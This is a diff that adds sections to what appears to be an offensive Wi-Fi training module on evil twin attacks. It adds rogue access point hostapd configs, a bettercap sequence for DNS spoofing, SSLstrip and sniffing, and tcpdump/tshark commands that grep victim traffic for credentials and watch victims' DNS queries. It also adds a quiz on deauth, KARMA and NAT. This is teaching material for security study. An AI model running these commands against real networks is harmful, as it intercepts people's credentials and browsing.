@@ -152,6 +152,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -538,6 +559,220 @@
       </div>
     </section>
 
+    <!-- Section 8: WPA2-PSK Rogue AP Config -->
+    <section id="wpa2-config">
+      <h2><span class="section-num">08</span> WPA2-PSK &amp; 5 GHz Rogue AP Configs</h2>
+      <p>For targets on WPA2-Personal or 5 GHz — use these hostapd configurations.</p>
+
+      <div class="config-block">
+        <div class="config-bar">
+          <span>&#128196; WPA2-PSK rogue AP (captures 4-way handshake)</span>
+          <button onclick="copyConfig(this,'copy-wpa2conf')">Copy</button>
+        </div>
+        <div class="config-body" id="copy-wpa2conf"><span class="cfg-key">interface</span>=<span class="cfg-val">wlan1</span>
+<span class="cfg-key">driver</span>=<span class="cfg-val">nl80211</span>
+<span class="cfg-key">ssid</span>=<span class="cfg-val">CoffeeShop</span>           <span class="cfg-comment"># Must match target SSID exactly</span>
+<span class="cfg-key">hw_mode</span>=<span class="cfg-val">g</span>
+<span class="cfg-key">channel</span>=<span class="cfg-val">6</span>
+<span class="cfg-key">country_code</span>=<span class="cfg-val">US</span>           <span class="cfg-comment"># Required for 5 GHz (regulatory)</span>
+<span class="cfg-key">auth_algs</span>=<span class="cfg-val">1</span>
+<span class="cfg-key">wpa</span>=<span class="cfg-val">2</span>                     <span class="cfg-comment"># WPA2</span>
+<span class="cfg-key">wpa_key_mgmt</span>=<span class="cfg-val">WPA-PSK</span>
+<span class="cfg-key">rsn_pairwise</span>=<span class="cfg-val">CCMP</span>
+<span class="cfg-key">wpa_passphrase</span>=<span class="cfg-val">password123</span> <span class="cfg-comment"># Passphrase clients must enter</span></div>
+      </div>
+
+      <div class="config-block" style="margin-top:16px;">
+        <div class="config-bar">
+          <span>&#128196; 5 GHz (802.11a) rogue AP — for clients preferring 5 GHz</span>
+          <button onclick="copyConfig(this,'copy-5ghz')">Copy</button>
+        </div>
+        <div class="config-body" id="copy-5ghz"><span class="cfg-key">interface</span>=<span class="cfg-val">wlan1</span>
+<span class="cfg-key">driver</span>=<span class="cfg-val">nl80211</span>
+<span class="cfg-key">ssid</span>=<span class="cfg-val">CoffeeShop</span>
+<span class="cfg-key">hw_mode</span>=<span class="cfg-val">a</span>              <span class="cfg-comment"># a = 5 GHz (requires country_code)</span>
+<span class="cfg-key">channel</span>=<span class="cfg-val">36</span>             <span class="cfg-comment"># UNII-1 channel (no DFS, safest for injection)</span>
+<span class="cfg-key">country_code</span>=<span class="cfg-val">US</span>        <span class="cfg-comment"># REQUIRED for 5 GHz regulatory domain</span>
+<span class="cfg-key">auth_algs</span>=<span class="cfg-val">1</span>
+<span class="cfg-key">wpa</span>=<span class="cfg-val">0</span>                  <span class="cfg-comment"># Open network</span>
+<span class="cfg-key">ieee80211n</span>=<span class="cfg-val">1</span>           <span class="cfg-comment"># Enable 802.11n HT capabilities</span>
+<span class="cfg-key">ieee80211ac</span>=<span class="cfg-val">1</span>          <span class="cfg-comment"># Enable 802.11ac VHT capabilities</span>
+<span class="cfg-key">wmm_enabled</span>=<span class="cfg-val">1</span>          <span class="cfg-comment"># Required for 802.11n/ac</span></div>
+      </div>
+    </section>
+
+    <!-- Section 9: bettercap + Traffic Capture -->
+    <section id="bettercap">
+      <h2><span class="section-num">09</span> bettercap — Automated Evil Twin &amp; MITM</h2>
+      <p><code>bettercap</code> automates the full evil twin + MITM pipeline including DHCP, DNS spoofing, HTTP proxy, and credential capture in a single framework.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">bettercap interactive + caplet</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-bettercap')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-bettercap"><span class="cmt"># Start bettercap on AP interface</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo bettercap <span class="flag">-iface</span> wlan1</span>
+
+<span class="cmt"># Inside bettercap interactive shell:</span>
+<span class="out">bettercap&gt; </span><span class="cmd">wifi.recon on</span>               <span class="cmt"># Start scanning</span>
+<span class="out">bettercap&gt; </span><span class="cmd">wifi.show</span>                   <span class="cmt"># List APs</span>
+<span class="out">bettercap&gt; </span><span class="cmd">set wifi.ap.ssid CoffeeShop</span>
+<span class="out">bettercap&gt; </span><span class="cmd">set wifi.ap.bssid AA:BB:CC:DD:EE:FF</span>
+<span class="out">bettercap&gt; </span><span class="cmd">set wifi.ap.channel 6</span>
+<span class="out">bettercap&gt; </span><span class="cmd">wifi.ap on</span>                  <span class="cmt"># Start rogue AP</span>
+<span class="out">bettercap&gt; </span><span class="cmd">dhcp.server on</span>              <span class="cmt"># Serve DHCP</span>
+<span class="out">bettercap&gt; </span><span class="cmd">set dns.spoof.domains *</span>     <span class="cmt"># Spoof ALL DNS</span>
+<span class="out">bettercap&gt; </span><span class="cmd">dns.spoof on</span>
+<span class="out">bettercap&gt; </span><span class="cmd">set http.proxy.sslstrip true</span><span class="cmt"># Downgrade HTTPS→HTTP</span>
+<span class="out">bettercap&gt; </span><span class="cmd">http.proxy on</span>               <span class="cmt"># Enable HTTP MITM proxy</span>
+<span class="out">bettercap&gt; </span><span class="cmd">net.sniff on</span>                <span class="cmt"># Capture all plaintext</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Traffic capture on evil twin interface</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-trafficcap')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-trafficcap"><span class="cmt"># Capture ALL victim traffic on evil twin interface</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo tcpdump <span class="flag">-i</span> wlan1 <span class="flag">-w</span> victim_traffic.pcap</span>
+
+<span class="cmt"># Filter HTTP only (credentials often in POST requests)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo tcpdump <span class="flag">-i</span> wlan1 <span class="flag">-A</span> <span class="flag">-l</span> port 80 | grep <span class="flag">-i</span> <span class="str">'user\|pass\|login\|email'</span></span>
+
+<span class="cmt"># Live DNS query monitoring (see what sites client visits)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo tshark <span class="flag">-i</span> wlan1 <span class="flag">-Y</span> <span class="str">"dns.qry.name"</span> <span class="flag">-T</span> fields <span class="flag">-e</span> ip.src <span class="flag">-e</span> dns.qry.name</span>
+<span class="out-warn">10.0.0.42    google.com</span>
+<span class="out-warn">10.0.0.42    mail.gmail.com</span>
+<span class="out-warn">10.0.0.55    bank.example.com    ← sensitive!</span></div>
+      </div>
+
+      <div class="callout attack">
+        <span class="ci">&#128272;</span>
+        <div><strong>SSL Strip Limitation:</strong> HSTS-preloaded domains (Google, banking sites) cannot be stripped even with SSLstrip. VPN traffic is also immune. Focus on non-HSTS sites, HTTP-only services, and mobile app traffic that doesn't certificate-pin.</div>
+      </div>
+    </section>
+
+    <!-- Section 10: Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">10</span> Knowledge Check</h2>
+
+      <div class="quiz-container">
+        <h3>&#127358; Module 09 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">A client is connected to "CoffeeShop" (BSSID AA:BB:CC:DD:EE:FF). You start an evil twin with the same SSID but lower signal. Which additional step ensures the client connects to your AP?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)">Spoof the same BSSID — clients prefer the matching BSSID regardless of signal</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)">Send deauth frames to kick the client off the real AP, then boost TX power so your evil twin has stronger signal during the client's scan</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">Run a beacon flood to hide the legitimate AP from the client's scan</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">Start a KARMA attack — it automatically overrides the client's preferred AP</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">What virtual interface does <code>airbase-ng</code> create and why is it important?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">wlan0mon — the monitor-mode interface for capturing client frames</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)"><code>at0</code> — a virtual tap interface that represents the AP's network side, used to assign an IP, run dnsmasq, and configure iptables NAT routing</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">eth0 — a bridge interface connecting the AP to the internet</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">tun0 — a tunnel interface for forwarding VPN traffic</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text">In the dnsmasq config, what does the directive <code>address=/#/10.0.0.1</code> do?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">It assigns the IP 10.0.0.1 to the DHCP gateway only</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">It returns 10.0.0.1 for ALL DNS queries regardless of domain — redirecting every website to the attacker's machine for captive portal or credential harvesting</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">It blocks all DNS queries from subnet 10.0.0.0/24</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">It configures the DNS server to forward queries to 10.0.0.1 as an upstream resolver</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">What is the difference between using <code>hostapd</code> with <code>hw_mode=g</code> vs <code>hw_mode=a</code>?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)">hw_mode=g uses WPA2 encryption; hw_mode=a is for open networks</button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">hw_mode=g = 2.4 GHz (channels 1-13); hw_mode=a = 5 GHz (channels 36+). 5 GHz requires <code>country_code</code> directive and is needed to target clients on 5 GHz networks</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">hw_mode=g is for Gigabit speed; hw_mode=a is for slower 54 Mbps</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">hw_mode=g enables 802.11g beacons; hw_mode=a enables 802.11ax (Wi-Fi 6)</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">The <code>iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE</code> rule does what in an evil twin setup?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)">It blocks all outbound traffic from connected clients</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">It captures all DNS queries and redirects them to the attacker</button>
+            <button class="option-btn" onclick="answer(this,'q5',true)">It performs NAT (Network Address Translation) — masquerading client traffic as coming from the attacker's wlan0 IP, allowing evil twin clients to access the internet transparently through the attacker</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">It forwards only HTTPS traffic and drops HTTP to prevent cleartext capture</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">What does <code>airbase-ng -P -C 30 -e "default" wlan1mon</code> enable and how does it differ from a standard evil twin?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">-P enables WPA2-PSK mode; -C 30 sets the passphrase rotation every 30 seconds</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">-P enables KARMA mode — the AP responds to every probe request with the matching SSID. Unlike a standard evil twin (fixed SSID), KARMA impersonates any network a client is looking for, catching multiple device types simultaneously</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">-P enables promiscuous mode; -C 30 captures 30 frames per client</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">-P enables PMKID capture mode; -C rotates channels every 30 seconds</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">A client connects to your evil twin over HTTPS. You run SSL strip with bettercap. The client visits a bank website and the downgrade fails. Why?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">Your iptables FORWARD rules are blocking HTTPS port 443</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">Major banking sites use HSTS preloading — the browser has a hardcoded list of HTTPS-only domains. No MITM tool can strip HTTPS from HSTS-preloaded sites regardless of the proxy setup</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">SSL strip only works on WEP networks; WPA2 clients are immune</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">The client's VPN is blocking the strip — disconnect the VPN first</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">What tshark command live-monitors DNS queries from clients connected to your evil twin interface (wlan1)?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)"><code>tshark -i wlan1mon -Y "wlan.fc.type_subtype==4" -T fields -e wlan_mgt.ssid</code></button>
+            <button class="option-btn" onclick="answer(this,'q8',false)"><code>tcpdump -i wlan1 -e type mgt subtype deauth</code></button>
+            <button class="option-btn" onclick="answer(this,'q8',true)"><code>sudo tshark -i wlan1 -Y "dns.qry.name" -T fields -e ip.src -e dns.qry.name</code></button>
+            <button class="option-btn" onclick="answer(this,'q8',false)"><code>tshark -i at0 -Y "eapol" -T fields -e eapol.keydes.msgnr</code></button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <!-- Nav -->
     <div class="nav-footer">
       <a href="../module-08-deauth-dos/" class="nav-btn prev">&#8592; Module 08: Deauth &amp; DoS</a>
@@ -547,6 +782,78 @@
 </div>
 
 <script>
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. Signal strength is the primary factor when a client sees two APs with the same SSID. Deauthing the client from the real AP forces a reconnect scan. With your evil twin boosted to higher TX power, it appears stronger and the client connects. BSSID spoofing helps but alone doesn't beat a live, stronger legitimate AP.",
+      wrong: "Incorrect. When two APs broadcast the same SSID, the client chooses by signal strength. To win: (1) deauth the client from the real AP, (2) ensure your evil twin has stronger signal. BSSID spoofing alone doesn't override a live stronger AP."
+    },
+    q2: {
+      correct: "Correct. airbase-ng creates a virtual tap interface called at0 when it starts. at0 is the 'network side' of the software AP — you assign it an IP (e.g., 10.0.0.1/24), run dnsmasq on it for DHCP/DNS, and configure iptables to NAT traffic from at0 to the internet-facing interface.",
+      wrong: "Incorrect. airbase-ng creates a virtual tap interface called at0 — the network-facing side of the software AP. You assign an IP to at0, run dnsmasq against it (not against wlan1mon), and configure iptables NAT rules on at0."
+    },
+    q3: {
+      correct: "Correct. In dnsmasq, 'address=/#/IP' is a wildcard address record that responds to ALL DNS queries with the specified IP. Every domain — google.com, facebook.com, anything — resolves to 10.0.0.1. This forces all browser traffic to your machine, which is essential for captive portal (Module 10) or credential harvesting.",
+      wrong: "Incorrect. address=/#/10.0.0.1 is dnsmasq's wildcard DNS response — it matches every domain and returns 10.0.0.1 for all of them. This redirects all web traffic to the attacker, essential for captive portal setups."
+    },
+    q4: {
+      correct: "Correct. hw_mode=g = IEEE 802.11g = 2.4 GHz band (channels 1-13, 54 Mbps). hw_mode=a = IEEE 802.11a = 5 GHz band (channels 36+ in UNII-1/UNII-3). Modern clients often prefer 5 GHz. Using hw_mode=a with country_code targets clients on dual-band or 5 GHz-only networks.",
+      wrong: "Incorrect. hw_mode=g = 2.4 GHz 802.11g. hw_mode=a = 5 GHz 802.11a. The 'a' stands for the 802.11a amendment (5 GHz), not 802.11ax. country_code is required for 5 GHz operation in hostapd to define valid channel ranges."
+    },
+    q5: {
+      correct: "Correct. MASQUERADE is an iptables NAT rule that translates source IPs of outgoing packets. Clients on the evil twin (10.0.0.x) send traffic → MASQUERADE rewrites the source IP to the attacker's wlan0 IP → internet responses come back to attacker → forwarded to client. From the internet's perspective, all traffic appears to come from the attacker's IP.",
+      wrong: "Incorrect. MASQUERADE performs Source NAT on outbound packets via wlan0. It rewrites client source IPs (10.0.0.x) to the attacker's public IP, allowing internet responses to route back. This is what makes the evil twin function as a transparent internet gateway."
+    },
+    q6: {
+      correct: "Correct. -P enables KARMA mode in airbase-ng — it sniffs probe requests and responds with a matching Probe Response for every SSID requested. -C 30 broadcasts each discovered SSID as a beacon for 30 seconds. Unlike a standard evil twin (one fixed SSID), KARMA simultaneously impersonates every network in range clients are probing for.",
+      wrong: "Incorrect. -P = KARMA mode (respond to ALL probe requests). -C = beacon broadcast duration per SSID. KARMA is more powerful than a standard evil twin because it automatically impersonates whatever network each specific device is looking for, rather than just one fixed SSID."
+    },
+    q7: {
+      correct: "Correct. HSTS (HTTP Strict Transport Security) preloading is a browser mechanism where a hardcoded list of domains is HTTPS-only — the browser will NEVER send HTTP to these domains, even if forced by an MITM. No SSLstrip, bettercap, or MITM proxy can bypass HSTS preloading. Banks, Google, and major sites are all preloaded.",
+      wrong: "Incorrect. HSTS preloading is the reason. Major bank sites (and Google, Facebook, etc.) are on the HSTS preload list — browsers have these hardcoded as HTTPS-only. No MITM tool can strip TLS from HSTS-preloaded domains regardless of proxy configuration."
+    },
+    q8: {
+      correct: "Correct. This tshark command filters DNS query name frames on wlan1 (the evil twin interface) and extracts the source IP (client's IP) and queried domain name. This reveals every website the client's device is trying to access in real time — extremely useful for reconnaissance.",
+      wrong: "Incorrect. The correct command is: sudo tshark -i wlan1 -Y 'dns.qry.name' -T fields -e ip.src -e dns.qry.name. This captures DNS queries on the evil twin's network interface and extracts source IPs and queried domain names — showing you what sites clients are visiting."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 10!' : pct >= 0.75 ? 'Strong — review missed questions.' : pct >= 0.5 ? 'Getting there — re-read the dnsmasq, hostapd, and bettercap sections.' : 'Re-read the routing/NAT, KARMA, and HSTS sections.';
+      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
+      scoreEl.classList.add('show');
+    }
+  }
+
   // Copy terminal content
   function copyTerm(btn, id) {
     const el = document.getElementById(id);
